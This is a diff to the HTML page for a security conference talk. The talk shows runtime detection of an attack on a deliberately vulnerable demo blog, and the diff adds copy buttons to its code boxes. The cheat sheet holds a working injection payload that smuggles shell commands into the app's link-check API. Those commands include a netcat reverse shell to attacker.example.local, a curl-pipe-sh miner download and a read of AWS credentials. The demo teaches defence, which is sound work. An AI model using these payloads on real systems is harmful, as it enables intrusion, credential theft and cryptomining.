@@ -72,6 +72,11 @@ blockquote.key{border-left-color:var(--keyline);background:var(--key);font-size:
 .do .tag{font:700 11px/1.9 var(--mono);color:var(--doline);letter-spacing:.06em}
 code{background:var(--code);padding:.1rem .35rem;border-radius:4px;font-size:.87em;font-family:var(--mono)}
 pre{background:var(--code);padding:12px 14px;border-radius:8px;overflow:auto}
+.codewrap{position:relative}
+.codewrap pre{padding-right:72px}
+.copy{position:absolute;top:8px;right:8px;z-index:2;font:600 12px/1 "Red Hat Text",sans-serif;color:#fff;background:#ee0000;border:0;border-radius:6px;padding:6px 10px;cursor:pointer;opacity:.85}
+.copy:hover{opacity:1}
+.copy.done{background:#3e8635}
 pre code{background:none;padding:0}
 kbd{font:600 .85em var(--mono);border:1px solid var(--line);border-bottom-width:2px;border-radius:5px;padding:0 .35em;background:var(--panel)}
 .tw{overflow-x:auto;margin:1rem 0;border:1px solid var(--line);border-radius:8px}
@@ -300,13 +305,17 @@ figcaption{font-size:.8rem;color:var(--muted);padding:4px 2px 0;line-height:1.35
 <ul><li><strong>The full talk, word for word (speaker notes): <a href="SCRIPT.md" target="_blank" rel="noopener">SCRIPT.md</a></strong></li><li><strong>One page to memorize: <a href="CHEATSHEET.md" target="_blank" rel="noopener">CHEATSHEET.md</a></strong></li><li>This page: how to speak to the room, run of show, Q&amp;A and checklist. Same content as a web page: <a href="TALK.html" target="_blank" rel="noopener">TALK.html</a></li><li>Setup and the demo mechanics: <a href="../README.md" target="_blank" rel="noopener">../README.md</a></li><li>What every act looks like on screen: <a href="WALKTHROUGH.md" target="_blank" rel="noopener">WALKTHROUGH.md</a></li></ul></section>
 <section class="page" id="cheat-sheet" data-i="1" hidden><div class="crumb">Start </div><h2>Cheat sheet</h2><p>One page to memorize. Read it the night before. Keep it next to the laptop. The full text is in <a href="SCRIPT.md" target="_blank" rel="noopener">SCRIPT.md</a>.</p>
 <h3 id="fire-the-attack-from-the-browser-no-terminal">Fire the attack from the browser (no terminal)</h3>
-<p>Open <code>https://blog-unhackable.apps-crc.testing/write</code> → <strong>F12 → Console</strong> → paste. The <code>/write</code> box only forwards real links, so the attacker goes around it and POSTs to the API. Same code path, same detections.</p>
-<pre><code>const cmd = &quot;id; uname -a; cat ~/.aws/credentials&quot;;                                                                // Act 2 RCE
-// const cmd = &quot;nohup nc attacker.example.local 4444 -e /bin/sh &gt;/dev/null 2&gt;&amp;1 &amp; echo &#x27;[+] reverse shell launched&#x27;&quot;; // Act 4 shell (C2 up)
-// const cmd = &quot;curl -s http://attacker.example.local:8080/stage.sh | sh&quot;;                                          // Act 4 miner
+<p>Open <code>https://blog-unhackable.apps-crc.testing/write</code> → <strong>F12 → Console</strong> → paste. The <code>/write</code> box only forwards real links, so the attacker goes around it and POSTs to the API. Same code path, same detections. (In <a href="TALK.html" target="_blank" rel="noopener">TALK.html</a> each box has a <strong>Copy</strong> button.)</p>
+<p><strong>Step 1 — show it runs any command</strong> (who am I, what is in my env):</p>
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>const cmd = &quot;id; env&quot;;
 const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString(&quot;${btoa(cmd)}&quot;); out, _ := exec.Command(&quot;sh&quot;, &quot;-c&quot;, string(c)).Output(); return string(out) })()`;
 fetch(&#x27;/api/links/check&#x27;, {method:&#x27;POST&#x27;, headers:{&#x27;Content-Type&#x27;:&#x27;application/json&#x27;}, body: JSON.stringify({urls:[rule]})})
-  .then(r =&gt; r.json()).then(d =&gt; console.log(d.results[0].detail || d.results[0]));</code></pre>
+  .then(r =&gt; r.json()).then(d =&gt; console.log(d.results[0].detail || d.results[0]));</code></pre></div>
+<p><strong>Step 2 — later, the reverse shell</strong> (C2 listener up first), or swap <code>cmd</code> for the miner <code>curl -s http://attacker.example.local:8080/stage.sh | sh</code>:</p>
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>const cmd = &quot;nohup nc attacker.example.local 4444 -e /bin/sh &gt;/dev/null 2&gt;&amp;1 &amp; echo &#x27;[+] reverse shell launched&#x27;&quot;;
+const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString(&quot;${btoa(cmd)}&quot;); out, _ := exec.Command(&quot;sh&quot;, &quot;-c&quot;, string(c)).Output(); return string(out) })()`;
+fetch(&#x27;/api/links/check&#x27;, {method:&#x27;POST&#x27;, headers:{&#x27;Content-Type&#x27;:&#x27;application/json&#x27;}, body: JSON.stringify({urls:[rule]})})
+  .then(r =&gt; r.json()).then(d =&gt; console.log(d.results[0].detail || d.results[0]));</code></pre></div>
 <h3 id="the-spine-if-you-forget-everything-say-this">The spine — if you forget everything, say this</h3>
 <p>Every check happens during build and during deployment — <strong>before</strong> the application runs. <strong>Secure today. Maybe not tomorrow.</strong> RHACS rescans every 4 hours. But no scan can see <strong>what nobody knows yet</strong>, <strong>what nobody noticed</strong>, or <strong>what somebody hid</strong>. <strong>A scan sees what is known. Runtime sees what happens. RHACS does both.</strong></p>
 <h3 id="the-five-words">The five words</h3>
@@ -441,7 +450,7 @@ fetch(&#x27;/api/links/check&#x27;, {method:&#x27;POST&#x27;, headers:{&#x27;Con
 <p>And one big vulnerability.</p>
 <p>So what happens if I send a rule instead of a link?</p></section>
 <section class="page" id="act-2-day-zero" data-i="17" hidden><div class="crumb">Speaker notes <span class="pill">⏱ 8:30</span></div><h2>Act 2: Day zero</h2><div class="do"><span class="tag">DO</span><span>Terminal A, large font.</span></div>
-<pre><code>scripts/demo.sh act2</code></pre>
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>scripts/demo.sh act2</code></pre></div>
 <div class="do"><span class="tag">DO</span><span>The commands run. <code>id</code>, <code>uname</code>, <code>/etc/os-release</code> come back. Let people read.</span></div>
 <p>I just ran my own commands inside the application. From outside. Through the website. With one form.</p>
 <p>And this is not a CVE. There is no package to update. No security notice. Nobody in the world knows about it — except me.</p>
@@ -462,7 +471,7 @@ fetch(&#x27;/api/links/check&#x27;, {method:&#x27;POST&#x27;, headers:{&#x27;Con
 <p>And it does not care who wrote the code. A mistake or a backdoor — like the one in the Claude Code extension — must <em>do</em> something to be useful. Run a program. Write a file. Open a connection. That is what RHACS watches. A backdoor can look clean. It cannot behave clean.</p><section class="screens"><h3>On screen — backup screenshots</h3><blockquote class="key"><em>"One clean dependency (yaegi, 0 CVEs). One evaluated rule. No scanner on earth reports this."</em></blockquote>
 <div class="gallery"><figure><img loading="lazy" src="img/08-term-act2.png" alt="Terminal — the link checker becomes RCE"><figcaption>Terminal — the link checker becomes RCE</figcaption></figure> <figure><img loading="lazy" src="img/09-rhacs-violations-act2.png" alt="RHACS — Unauthorized process violation"><figcaption>RHACS — Unauthorized process violation</figcaption></figure> <figure><img loading="lazy" src="img/10-rhacs-violation-process.png" alt="RHACS — the process that ran"><figcaption>RHACS — the process that ran</figcaption></figure></div></section></section>
 <section class="page" id="act-3-loot" data-i="18" hidden><div class="crumb">Speaker notes <span class="pill">⏱ 12:00</span></div><h2>Act 3: Loot</h2><div class="do"><span class="tag">DO</span><span>Terminal A.</span></div>
-<pre><code>scripts/demo.sh act3</code></pre>
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>scripts/demo.sh act3</code></pre></div>
 <p>Now think like an attacker. You are inside. What do you do first?</p>
 <p>You look for passwords and keys.</p>
 <div class="do"><span class="tag">DO</span><span>The token check and environment check come back empty.</span></div>
@@ -496,15 +505,15 @@ fetch(&#x27;/api/links/check&#x27;, {method:&#x27;POST&#x27;, headers:{&#x27;Con
 <div class="do"><span class="tag">DO</span><span>Turn to Terminal B. Make it visible.</span></div>
 <p>This terminal is the attacker's computer. It is outside the cluster. Its name is <code>attacker.example.local</code>. It is waiting for a call.</p>
 <div class="do"><span class="tag">DO</span><span>Terminal B:</span></div>
-<pre><code>scripts/attacker.sh c2</code></pre>
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>scripts/attacker.sh c2</code></pre></div>
 <div class="do"><span class="tag">DO</span><span>Terminal A:</span></div>
-<pre><code>scripts/demo.sh act4</code></pre>
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>scripts/demo.sh act4</code></pre></div>
 <div class="do"><span class="tag">DO</span><span>The reverse shell connects. Terminal B receives it.</span></div>
 <p>And the blog called the attacker. Out to the internet. Because nothing said it could not.</p>
 <div class="do"><span class="tag">DO</span><span>Type slowly in Terminal B:</span></div>
-<pre><code>id
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>id
 hostname
-ps</code></pre>
+ps</code></pre></div>
 <p>This is a live shell. Inside my "secure" application. Typed by a person on a computer outside the data center.</p>
 <p>Now the attacker wants money.</p>
 <div class="do"><span class="tag">DO</span><span>Terminal A continues: the miner is downloaded and started.</span></div>
@@ -535,7 +544,7 @@ ps</code></pre>
 <p>These are the rules that found the attack. I did not click them together in a screen. They are Kubernetes files, in Git. They go through the same review and pipeline as my code.</p>
 <p>Step one: limit the damage.</p>
 <div class="do"><span class="tag">DO</span><span>Terminal A:</span></div>
-<pre><code>scripts/demo.sh act5</code></pre>
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>scripts/demo.sh act5</code></pre></div>
 <p>I am changing these rules from "tell me" to "act". If this application runs anything outside its normal list, kill the pod.</p>
 <div class="do"><span class="tag">DO</span><span>Enforcement on. The attacker comes back with <code>id</code>.</span></div>
 <p>The attacker comes back. They run a command —</p>
@@ -562,7 +571,7 @@ ps</code></pre>
 <p>And this is the fix. No more rules. Check that the link is a real web address, and fetch it with a normal web client. Nothing is run as code.</p>
 <p>I did not have to guess where the problem was. RHACS showed me which feature was attacked, how, and from where. The fix is small.</p>
 <div class="do"><span class="tag">DO</span><span>Terminal A:</span></div>
-<pre><code>scripts/demo.sh act6</code></pre>
+<div class="codewrap"><button type="button" class="copy" aria-label="Copy to clipboard">Copy</button><pre><code>scripts/demo.sh act6</code></pre></div>
 <div class="do"><span class="tag">DO</span><span>Version 2 starts. The scan still says 0 CVEs. The attack now returns only "not a valid http(s) URL".</span></div>
 <p>Version two. Still zero CVEs. And the attack is now rejected: it is not a valid web address.</p>
 <p>And remember: runtime security did not replace the fix. It kept me safe until the fix was ready. That is its job.</p><section class="screens"><h3>On screen — backup screenshots</h3><blockquote class="key"><em>"Runtime didn't replace patching. It kept me safe until the patch was ready."</em></blockquote>
@@ -1070,5 +1079,15 @@ ps</code></pre>
   if(SPEAKER) startSpeaker();
   else if(Q.has('present')){ const n=parseInt(Q.get('present'),10); openDeck(isNaN(n)?0:n-1); if(Q.has('step')) to(di,parseInt(Q.get('step'),10)||0); if(Q.has('layout')) layout(Q.get('layout')) }
 })();
+</script>
+<script>
+document.addEventListener('click',function(e){
+  var b=e.target.closest('.copy'); if(!b) return;
+  var code=b.parentElement.querySelector('code'); if(!code) return;
+  var text=code.innerText;
+  var done=function(){ b.textContent='Copied'; b.classList.add('done'); setTimeout(function(){ b.textContent='Copy'; b.classList.remove('done'); },1200); };
+  if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(text).then(done,function(){}); }
+  else { var ta=document.createElement('textarea'); ta.value=text; document.body.appendChild(ta); ta.select(); try{document.execCommand('copy');done();}catch(_){} ta.remove(); }
+});
 </script>
 </body></html>
